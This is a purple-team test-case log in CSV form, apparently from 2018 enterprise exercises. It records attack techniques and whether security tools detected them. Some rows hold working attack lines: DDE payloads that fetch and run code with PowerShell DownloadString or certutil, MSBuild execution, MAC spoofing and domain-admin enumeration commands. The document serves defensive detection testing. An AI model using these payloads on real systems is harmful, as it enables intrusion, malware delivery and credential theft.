Enterprise Purple – 2018 Q1,Suspicious Process Execution,Exploitation,Obfuscated Commands - PowerShell,T1059.001,,Trusted Windows Binary,Completed,Detected,High,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR,Endpoint Protection",DoDonpachi,2018-01-14T00:43:37.130Z,1515890617130,2018-01-14T02:31:57.130Z,1515897117130,2019-01-28T17:11:22.067Z,1548695482067,Security Risk Advisors,,Run an obfuscated PowerShell command to run a malicious command.,invoke-obfuscation -> run command,,Low,Low,Internal,Low,,,,PowerShell
Enterprise Purple – 2018 Q1,NAC Bypass,Exploitation,Network Device MAC Address,,,NAC bypass,Completed,NotDetected,TBD,TBD,No,,1) Rogue device triggers alert when unknown device connects to LAN.,,,Network Isolation,,2018-01-16T06:01:26.130Z,1516082486130,2018-01-16T07:54:36.130Z,1516089276130,2018-01-16T09:18:51.130Z,1516094331130,Security Risk Advisors,,Change the MAC address to a network device manufacturer code.,Use device manager and change the mac address value for network adapter,,High,High,Internal,Medium,,,,"Manual Techniques,Native Windows Commands"
Enterprise Purple – 2018 Q1,NAC Bypass,Exploitation,Static IP Address,,,NAC bypass,Completed,Detected,Low,TBD,No,,1) Rogue device triggers alert when unknown device connects to LAN.,,,Network Isolation,Radiant Silvergun,2018-01-16T23:33:11.130Z,1516145591130,2018-01-17T01:10:55.130Z,1516151455130,2019-01-28T17:44:00.635Z,1548697440635,Security Risk Advisors,,Set a static IP address on the attack host to bypass any network restrictions.,Change ip address of network adapter to a static address,,High,High,Internal,Medium,,,,Manual Techniques
Enterprise Purple – 2018 Q1,NAC Bypass,Discovery,Passive Network Recon,T1049,,Passive network recon,Completed,Detected,Low,TBD,No,,1) Rogue device triggers alert when unknown device connects to LAN.,,,"Network Isolation,Behavior Analytics",Radiant Silvergun,2018-01-15T22:15:26.130Z,1516054526130,2018-01-15T22:32:40.130Z,1516055560130,2019-01-28T17:43:29.228Z,1548697409228,Security Risk Advisors,,"Obtain information from the network including MAC addresses, valid IP addresses, and hostnames.",,,High,High,Internal,High,,,,"Manual Techniques,Native Windows Commands"
Enterprise Purple – 2018 Q1,NAC Bypass,Exploitation,PC MAC Address,,,NAC bypass,Completed,NotDetected,TBD,TBD,No,,1) Rogue device triggers alert when unknown device connects to LAN.,,,Network Isolation,,2018-01-16T17:40:30.130Z,1516124430130,2018-01-16T17:44:42.130Z,1516124682130,2018-01-16T19:13:07.130Z,1516129987130,Security Risk Advisors,,Change the MAC address to a PC manufacturer code.,,,High,High,Internal,Medium,,,,Manual Techniques
Enterprise Purple – 2018 Q1,NAC Bypass,Exploitation,Printer MAC Address,,,NAC bypass,Completed,NotDetected,TBD,TBD,No,,1) Rogue device triggers alert when unknown device connects to LAN.,,,Network Isolation,,2018-01-16T11:09:15.130Z,1516100955130,2018-01-16T12:12:32.130Z,1516104752130,2018-01-16T13:15:01.130Z,1516108501130,Security Risk Advisors,,Change the MAC address to a printer manufacturer code.,"#Linux
macchanger -m <MAC> <Interface>
#Windows
Device Manager -> Network Adapters -> Advanced
Look for Locally Administrative Address or Network Address and change the value for that (No : needed)",,High,High,Internal,Medium,,,,Manual Techniques
Enterprise Purple – 2018 Q1,NAC Bypass,Exploitation,Apple MAC Address,,,NAC bypass,Completed,NotDetected,TBD,TBD,No,,1) Rogue device triggers alert when unknown device connects to LAN.,,,Network Isolation,,2018-01-16T20:02:23.130Z,1516132943130,2018-01-16T21:02:40.130Z,1516136560130,2018-01-16T21:57:40.130Z,1516139860130,Security Risk Advisors,,Change the MAC address to a Apple manufacturer code.,"Disable wifi and run the following:
sudo ifconfig en0 ether <New_Mac_Address>",,High,High,Internal,Medium,,,,Manual Techniques
Enterprise Purple – 2018 Q1,NAC Bypass,Exploitation,Raspberry Pi,,,NAC bypass,Completed,NotDetected,TBD,TBD,No,,1) Rogue device triggers alert when unknown device connects to LAN.,,,Network Isolation,,2018-01-16T01:30:58.130Z,1516066258130,2018-01-16T02:38:19.130Z,1516070299130,2018-01-16T04:03:07.130Z,1516075387130,Security Risk Advisors,,Connect an untrusted device to the network to exploit NAC controls.,Connect raspberry pi into a wall jack.,,Low,High,Internal,Medium,,,,Manual Techniques
Enterprise Purple – 2018 Q1,NAC Bypass,Exploitation,Unusual MAC Address,,,NAC bypass,Completed,NotDetected,TBD,TBD,No,,1) Rogue device triggers alert when unknown device connects to LAN.,,,Network Isolation,,2018-01-16T15:06:26.130Z,1516115186130,2018-01-16T16:44:46.130Z,1516121086130,2018-01-16T17:15:06.130Z,1516122906130,Security Risk Advisors,,Change the MAC address to an unusual manufacturer code.,"In device manager, change the network adapter's mac address value",,High,High,Internal,Medium,,,,Manual Techniques
Enterprise Purple – 2018 Q1,Register Phishing Domains,Reconnaissance,Domain registration containing brand keyword,,,Register possible phishing domain,Completed,NotDetected,TBD,TBD,No,,1) Phishing domain is alerted by possible brand monitoring / DNS monitoring service.,,,,,2018-01-04T20:51:44.130Z,1515099104130,2018-01-04T22:05:54.130Z,1515103554130,2018-01-04T23:53:17.130Z,1515109997130,Security Risk Advisors,,Register domains containing company keywords/branding,,,High,Medium,External,Medium,,,,
Enterprise Purple – 2018 Q1,Register Phishing Domains,Reconnaissance,Domain registration containing lexically close name,,,Register possible phishing domain,Completed,NotDetected,TBD,TBD,No,,1) Phishing domain is alerted by possible brand monitoring / DNS monitoring service.,,,,,2018-01-05T00:58:29.130Z,1515113909130,2018-01-05T02:57:04.130Z,1515121024130,2018-01-05T03:08:06.130Z,1515121686130,Security Risk Advisors,,Register domains containing names that resemble prominent web domains.,,,High,Medium,External,Medium,,,,
Enterprise Purple – 2018 Q1,Email With Malicious Attachments,Delivery,7 - Macro - WScript PowerShell XOR,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2018-01-06T21:40:01.130Z,1515274801130,2018-01-06T23:07:00.130Z,1515280020130,2019-01-28T16:55:55.936Z,1548694555936,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Copy macro template into office document,,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2018 Q1,Email With Malicious Attachments,Delivery,2 - Macro - CobaltStrike Standard (MMG),T1566.001,,Phishing Payload,Completed,Blocked,TBD,No,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Twin Hawk,2018-01-05T07:14:02.130Z,1515136442130,2018-01-05T07:50:22.130Z,1515138622130,2018-01-05T09:22:31.130Z,1515144151130,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,python MMG.py [config] [output],,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2018 Q1,Email With Malicious Attachments,Delivery,17 - Macro - LuckyStrike PowerShell CellEmbed + Sandbox Evasion,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2018-01-07T21:19:57.130Z,1515359997130,2018-01-07T22:38:22.130Z,1515364702130,2018-01-07T23:24:00.130Z,1515367440130,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"Run as admin:
.\luckystrike.ps1

Catalog Options -> Add Payload to Catalog (Name is required, everything else can be skipped) -> Powershell Script

Main Menu -> Payload Options -> xls  -> Cell Embedded

File Options -> File options -> Payload options  -> Generate New File",,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2018 Q1,Email With Malicious Attachments,Delivery,6 - Macro - WScript EXE,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2018-01-06T19:09:14.130Z,1515265754130,2018-01-06T19:23:10.130Z,1515266590130,2019-01-28T16:55:18.953Z,1548694518953,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Copy macro template into office document,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2018 Q1,Email With Malicious Attachments,Delivery,20 - Password-protected Office Doc - Standard CS payload,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2018-01-05T20:04:51.130Z,1515182691130,2018-01-05T21:07:39.130Z,1515186459130,2018-01-05T22:55:50.130Z,1515192950130,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"Generate standard office payload using cobalt strike from Attacks -> Packages -> MS Office Macro

When saving the malicious macro, encrypt the document with a password by: Save -> Info -> Protect Document -> Encrypt With Password",,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2018 Q1,Email With Malicious Attachments,Delivery,10 - Macro - MSBuild,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2018-01-06T16:00:08.130Z,1515254408130,2018-01-06T16:36:10.130Z,1515256570130,2018-01-06T18:32:34.130Z,1515263554130,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe <MALICIOUS_FILE>,,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2018 Q1,Email With Malicious Attachments,Delivery,1 - Macro - Cobalt Strike Standard,T1566.001,,Phishing Payload,Completed,Blocked,TBD,No,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Twin Hawk,2018-01-05T04:22:52.130Z,1515126172130,2018-01-05T04:57:19.130Z,1515128239130,2018-01-05T06:40:02.130Z,1515134402130,Security Risk Advisors,,Send phishing email to victim containing link with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"Attacks --> Packages --> MS Office Macro
Copy code to office document",,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2018 Q1,Email With Malicious Attachments,Delivery,3 - Macro - Cobalt Strike Standard as HREF (URL Rewrite Update),T1566.001,,Phishing Payload,Completed,Blocked,TBD,No,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Twin Hawk,2018-01-06T05:57:00.130Z,1515218220130,2018-01-06T06:27:26.130Z,1515220046130,2018-01-06T07:15:17.130Z,1515222917130,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,,,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2018 Q1,Email With Malicious Attachments,Delivery,4 - Macro - Cobalt Strike Standard (URL Rewrite Update),T1566.001,,Phishing Payload,Completed,Blocked,TBD,TBD,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Twin Hawk,2018-01-06T07:50:38.130Z,1515225038130,2018-01-06T09:47:45.130Z,1515232065130,2018-01-06T12:49:06.130Z,1515242946130,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,,,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2018 Q1,Email With Malicious Attachments,Delivery,8 - Macro - MMG WMI PowerShell,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2018-01-07T01:32:30.130Z,1515288750130,2018-01-07T03:30:52.130Z,1515295852130,2019-01-28T16:56:17.013Z,1548694577013,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,python MMG.py [config] [output],,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2018 Q1,Email With Malicious Attachments,Delivery,12 - Macro - MMG WMI Exe,T1566.001,,Phishing Payload,Completed,Blocked,TBD,No,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Twin Hawk,2018-01-07T09:27:44.130Z,1515317264130,2018-01-07T11:13:35.130Z,1515323615130,2018-01-07T13:05:52.130Z,1515330352130,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,python MMG.py [config] [output],,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2018 Q1,Email With Malicious Attachments,Delivery,13 - DDE - Exe,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2018-01-07T13:40:42.130Z,1515332442130,2018-01-07T14:30:41.130Z,1515335441130,2018-01-07T16:08:49.130Z,1515341329130,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,=cmd|'/c certutil https://<exe url> <local file location> && <local file location> && del <local file location>'!A1,,Low,Low,External,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2018 Q1,Email With Malicious Attachments,Delivery,16 - Archive - DDE,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2018-01-05T13:15:54.130Z,1515158154130,2018-01-05T14:23:53.130Z,1515162233130,2018-01-05T14:51:57.130Z,1515163917130,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Zip the dde office document,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2018 Q1,Email With Malicious Attachments,Delivery,11 - DDE - PowerShell,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2018-01-05T10:17:52.130Z,1515147472130,2018-01-05T10:40:45.130Z,1515148845130,2018-01-05T12:08:29.130Z,1515154109130,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"=cmd|'/c powershell -Exec ByPass -nop -noexit -c IEX ((New-Object Net.WebClient).DownloadString(\""http://<location of payload>\""))'!A1",,Low,Low,External,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2018 Q1,Email With Malicious Attachments,Delivery,19 - Encrypted Archive - DDE,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2018-01-05T17:20:52.130Z,1515172852130,2018-01-05T19:19:28.130Z,1515179968130,2018-01-05T19:50:14.130Z,1515181814130,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Zip and encrypt the dde office document,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2018 Q1,Email With Malicious Attachments,Delivery,15 - Archive - Macro,T1566.001,,Phishing Payload,Completed,Blocked,TBD,No,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Twin Hawk,2018-01-07T16:36:12.130Z,1515342972130,2018-01-07T18:07:37.130Z,1515348457130,2018-01-07T20:05:49.130Z,1515355549130,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Zip or rar malicious document and send using email,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2018 Q1,Email With Malicious Attachments,Delivery,18 - Encrypted Archive - Macro,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2018-01-05T15:29:20.130Z,1515166160130,2018-01-05T15:37:30.130Z,1515166650130,2018-01-05T17:06:45.130Z,1515172005130,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Zip or rar and encrypt malicious document,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2018 Q1,Email With Malicious Attachments,Delivery,14 - Macro - Remote Template,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2018-01-05T12:13:42.130Z,1515154422130,2018-01-05T12:31:03.130Z,1515155463130,2018-01-05T12:54:03.130Z,1515156843130,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"Create a Word document, add the macro, then save as a .dotm 

Host the template

Create a new document and link the hosted template to it 
(Developer -> Document Template -> Document Template Url)",,Low,Low,External,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2018 Q1,Email With Malicious Attachments,Delivery,5 - Macro - WScript PowerShell,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,No,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2018-01-06T14:16:48.130Z,1515248208130,2018-01-06T14:18:59.130Z,1515248339130,2019-01-28T16:54:44.918Z,1548694484918,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Copy macro template into office document,,Low,Low,External,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2018 Q1,Email With Malicious Attachments,Delivery,21 - Link Inside PDF,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2018-01-05T23:53:47.130Z,1515196427130,2018-01-06T01:00:59.130Z,1515200459130,2018-01-06T02:22:30.130Z,1515205350130,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Create a PDF with a malicious link in it and send using email,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2018 Q1,Email With Malicious Attachments,Delivery,9 - Macro - LuckyStrike PowerShell CellEmbed,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2018-01-07T05:19:13.130Z,1515302353130,2018-01-07T06:11:49.130Z,1515305509130,2018-01-07T07:45:44.130Z,1515311144130,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"Run as admin:
.\luckystrike.ps1

Catalog Options -> Add Payload to Catalog (Name is required, everything else can be skipped) -> Powershell Script

Main Menu -> Payload Options -> xls  -> Cell Embedded

File Options -> File options -> Payload options  -> Generate New File",,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2018 Q1,Email With Malicious Attachments,Delivery,22 - Link Inside Office Document,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2018-01-06T02:40:05.130Z,1515206405130,2018-01-06T03:35:06.130Z,1515209706130,2018-01-06T05:14:34.130Z,1515215674130,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Send a office document with a malicious link in it,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2018 Q1,Windows Domain Enumeration,Discovery,Domain Enumeration - BloodHound,T1018,,Domain Enumeration,Completed,Detected,High,TBD,Yes,,"1) Windows enumeration activities detected from large amount of network traffic (SMB, ARP requests) from UEBA or network monitoring tools,2) Windows utilities used for enumeration are detected by EDR and/or SIEM rules",,,"SIEM,EDR,Behavior Analytics",Progear,2018-01-17T18:57:14.130Z,1516215434130,2018-01-17T19:16:05.130Z,1516216565130,2019-01-28T16:41:37.727Z,1548693697727,Security Risk Advisors,,"Use Bloodhound/Sharphound to preform queries across the local domain.

- Domain Group Memberships
- Domain Trusts
- Local Admins
- Sessions","Using SharpHound.ps1:
Invoke-BloodHound

Using SharpHound.exe:
SharpHound.exe",,High,Low,Internal,High,,,,
Enterprise Purple – 2018 Q1,Windows Domain Enumeration,Discovery,Domain Enumeration - NSlookup,T1018,,Domain Enumeration,Completed,NotDetected,TBD,TBD,No,,"1) Large number of scripted nslookup commands potentially detected by EDR and/or SIEM solution, or behavioral monitoring tool",,,"SIEM,EDR,Behavior Analytics",,2018-01-17T20:27:48.130Z,1516220868130,2018-01-17T20:50:53.130Z,1516222253130,2018-01-17T21:58:46.130Z,1516226326130,Security Risk Advisors,,"Leverage the builtin ""nslookup"" command to perform queries against the local DNS servers for specific server information.","DNS Servers: nslookup -type=NS [FQDN]
Domain Controllers: nslookup -type=SRV _ldap._tcp.[FQDN]",,High,Low,Internal,High,,,,Native Windows Commands
Enterprise Purple – 2018 Q1,Windows Domain Enumeration,Discovery,Domain Enumeration - NET,T1087,,Domain Enumeration,Completed,Detected,Low,TBD,No,,"1) Windows enumeration activities detected from large amount of network traffic (SMB, ARP requests) from UEBA or network monitoring tools,2) EDR and/or SIEM rules are configured to detect use of native commands such as 'net' and modern PowerShell equivalents",,,"SIEM,EDR,Behavior Analytics",DoDonpachi,2018-01-17T14:55:16.130Z,1516200916130,2018-01-17T14:55:44.130Z,1516200944130,2019-01-28T17:08:25.800Z,1548695305800,Security Risk Advisors,,"Leverage the builtin ""net"" command to perform queries against the Windows domain for common groups.","Domain Controllers:
net group ""Domain Controllers"" /domain

Domain Admins:
net group ""Domain Admins"" /domain

Administrators of the Domain:
net localgroup ""Administrators"" /domain",,High,Low,Internal,High,,,,Native Windows Commands
Enterprise Purple – 2018 Q1,Windows Domain Enumeration,Discovery,Domain Enumeration - LDAP using PowerShell,T1059.001,,Domain Enumeration,Completed,Detected,Info,TBD,No,,"1) Windows enumeration activities detected from large amount of network traffic (SMB, ARP requests) from UEBA or network monitoring tools,2) Legacy Windows and native PowerShell commands used for enumeration are detected by EDR and/or SIEM rules",,,"SIEM,EDR,Behavior Analytics",Progear,2018-01-17T15:38:35.130Z,1516203515130,2018-01-17T17:23:06.130Z,1516209786130,2019-01-28T16:41:23.749Z,1548693683749,Security Risk Advisors,,Use PowerView v3 to perform queries against the Windows domain for common groups.,"List All Admins:
Get-DomainGroupMember -Identity ""Administrators"" -Domain [FQDN] -Recurse | select MemberName | fl",,High,Low,Internal,High,,,,PowerView
Enterprise Purple – 2018 Q1,External Web App Profiling,Reconnaissance,Directory Brute Force - Sensitive API,,,Web App Discovery,Completed,NotDetected,TBD,TBD,TBD,,"1) An alert is configured on the external WAF, IDS/IPS, or firewall when a large number of HTTP requests are made to one or more external targets.,2) Web application logs are ingested into the SIEM and alerts triggered for suspicious activity (e.g. brute force attacks, large number of 400/500 status codes)",,,"Firewall,SIEM,WAF",,2018-01-03T19:47:38.130Z,1515008858130,2018-01-03T21:46:32.130Z,1515015992130,2018-01-03T22:00:42.130Z,1515016842130,Security Risk Advisors,,Enumerate files and directories on prominent external web apps.,,,High,Low,External,Low,,,,BurpSuite
Enterprise Purple – 2018 Q1,External Web App Profiling,Reconnaissance,Directory Brute Force - Customer Web App,,,Web App Discovery,Completed,NotDetected,TBD,TBD,TBD,,"1) An alert is configured on the external WAF, IDS/IPS, or firewall when a large number of HTTP requests are made to one or more external targets.,2) Web application logs are ingested into the SIEM and alerts triggered for suspicious activity (e.g. brute force attacks, large number of 400/500 status codes)",,,"Firewall,SIEM,WAF",,2018-01-03T16:00:07.130Z,1514995207130,2018-01-03T17:04:07.130Z,1514999047130,2018-01-03T17:10:17.130Z,1514999417130,Security Risk Advisors,,Enumerate files and directories on prominent external web apps.,,,High,Low,External,Low,,,,BurpSuite
Enterprise Purple – 2018 Q1,External Web App Profiling,Reconnaissance,Directory Brute Force - Enterprise Portal,,,Web App Discovery,Completed,NotDetected,TBD,TBD,TBD,,"1) An alert is configured on the external WAF, IDS/IPS, or firewall when a large number of HTTP requests are made to one or more external targets.,2) Web application logs are ingested into the SIEM and alerts triggered for suspicious activity (e.g. brute force attacks, large number of 400/500 status codes)",,,"Firewall,SIEM,WAF",,2018-01-03T18:08:53.130Z,1515002933130,2018-01-03T18:15:27.130Z,1515003327130,2018-01-03T19:27:38.130Z,1515007658130,Security Risk Advisors,,Enumerate files and directories on prominent external web apps.,,,High,Low,External,Low,,,,BurpSuite
Enterprise Purple – 2018 Q3,Physical Access,Exploitation,Laptop or workstation boot attack,T1091,,Workstation Local Attack,Completed,Blocked,TBD,No,TBD,,,,,Secure Baselines,Secure Configs,2018-08-15T11:23:23.717Z,1534332203717,2018-08-15T11:54:54.717Z,1534334094717,2018-08-15T13:43:43.717Z,1534340623717,Security Risk Advisors,,Attempt cold boot on laptops with missing or partial FDE,Load kali on boot-able usb,,Low,High,Both,Medium,,,,Manual Techniques
Enterprise Purple – 2018 Q3,Physical Access,Exploitation,Mouse Jacking,T1200,,Wireless Attack,Completed,Detected,Med,TBD,No,,1) Established C2 payload from mouse jacker payload is detected by EDR tool and/or SIEM events.,,,"SIEM,EDR,Secure Baselines",DoDonpachi,2018-08-15T07:00:31.717Z,1534316431717,2018-08-15T07:48:49.717Z,1534319329717,2019-01-28T19:30:42.071Z,1548703842071,Security Risk Advisors,,Attack local laptop via preexisting vulnerable USB mouse dongle.,jackit --script <Ducky_Script>,,Low,High,Internal,Medium,,,,"Native Windows Commands,Cobalt Strike,JackIt"
Enterprise Purple – 2018 Q3,Physical Access,Exploitation,Locked workstation attack,T1200,,Workstation Local Attack,Completed,NotDetected,TBD,TBD,No,,1) Payload run from bashbunny device is detected by EDR and/or SIEM rules,,,"SIEM,EDR,Secure Baselines",,2018-08-15T04:28:51.717Z,1534307331717,2018-08-15T05:33:55.717Z,1534311235717,2018-08-15T06:47:27.717Z,1534315647717,Security Risk Advisors,,"Setup rogue DHCP server and connect to laptop in locked state, intercept credentials using Responder tool.",Use bashbunny with responder loaded,,Low,High,Both,Medium,,,,"Responder,Manual Techniques"
Enterprise Purple – 2018 Q3,Physical Access,Exploitation,USB Rubby Ducky,T1091,,Workstation Local Attack,Completed,Detected,High,TBD,No,,1) Payload from rubber ducky is detected by EDR and/or SIEM rules,,,"SIEM,EDR,Secure Baselines","DoDonpachi,Progear",2018-08-15T09:07:52.717Z,1534324072717,2018-08-15T10:18:30.717Z,1534328310717,2019-01-28T19:30:16.105Z,1548703816105,Security Risk Advisors,,Attack local laptop/workstation using USB device to execute malicious code.,cmd /c \\<share>\<folder>\file.bat,,Medium,High,Internal,High,,,,"Native Windows Commands,Cobalt Strike"
Enterprise Purple – 2018 Q3,Register Phishing Domains,Reconnaissance,Domain registration containing lexically close name,,,Register possible phishing domain,Completed,NotDetected,TBD,TBD,No,,1) Phishing domain is alerted by possible brand monitoring / DNS monitoring service.,,,,,2018-08-05T00:59:17.717Z,1533430757717,2018-08-05T02:22:05.717Z,1533435725717,2018-08-05T03:39:08.717Z,1533440348717,Security Risk Advisors,,Register domains containing names that resemble prominent web domains.,,,High,Medium,External,Medium,,,,
Enterprise Purple – 2018 Q3,Register Phishing Domains,Reconnaissance,Domain registration containing brand keyword,,,Register possible phishing domain,Completed,Detected,High,TBD,No,,1) Phishing domain is alerted by possible brand monitoring / DNS monitoring service.,,,,,2018-08-04T20:59:22.717Z,1533416362717,2018-08-04T22:02:20.717Z,1533420140717,2019-01-28T19:22:46.855Z,1548703366855,Security Risk Advisors,,Register domains containing company keywords/branding,,,High,Medium,External,Medium,,,,
Enterprise Purple – 2018 Q3,Data Exfil Methods - Email and USB,Exfiltration,Email sensitive document to external recipient - SSN and CC,T1048,,Exfil data using email,Completed,Detected,High,TBD,Yes,,,,,DLP,Spriggan,2018-08-20T09:50:27.717Z,1534758627717,2018-08-20T11:10:36.717Z,1534763436717,2019-01-28T19:10:44.023Z,1548702644023,Security Risk Advisors,,"Email test data to simulate PII, credit card numbers, PHI, etc. leaving the network over email.",Email an external recipient with an email that contians SSN and CC numbers.,,Medium,High,Both,Low,,,,Manual Techniques
Enterprise Purple – 2018 Q3,Data Exfil Methods - Email and USB,Exfiltration,Extract data using popular sites,T1048,,Exfil data using popular websites,Completed,Blocked,TBD,No,No,,"1) Connections to popular online sites/cloud storage blocked by the proxy or firewall.,2) Attempts to exfil sensitive data over HTTP and HTTPS is detected in-line by DLP tools",,,"Web Gateway,DLP",MUSHA,2018-08-20T01:55:47.717Z,1534730147717,2018-08-20T03:45:32.717Z,1534736732717,2019-01-28T19:10:12.412Z,1548702612412,Security Risk Advisors,,Extract data from the network using popular websites and cloud storage services.,,,High,High,Both,Low,,,,Manual Techniques
